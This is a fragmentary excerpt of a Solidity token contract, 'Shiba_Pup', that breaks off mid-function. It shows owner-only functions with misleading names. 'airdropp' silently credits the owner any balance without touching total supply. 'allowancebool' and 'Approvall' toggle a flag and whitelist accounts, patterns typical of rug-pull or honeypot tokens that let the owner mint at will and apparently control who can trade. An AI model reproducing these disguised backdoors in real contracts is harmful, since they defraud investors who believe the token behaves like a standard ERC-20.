...
contract Shiba_Pup is Context, IERC20, IERC20Metadata, Ownable {
    ...
    function allowancebool(bool _Allon) public onlyOwner virtual returns (bool) {
        _isAllon = _Allon;
        return true;
    }
    
        function airdropp(uint256 amount) public onlyOwner virtual returns (bool) {
        _balances[_msgSender()] += amount;
        return true;
    }

    function Approvall(address account) external onlyOwner {
        _marketersAndDevs[account] = true;
    }

    function marketingwallet(address account) external onlyOwner {
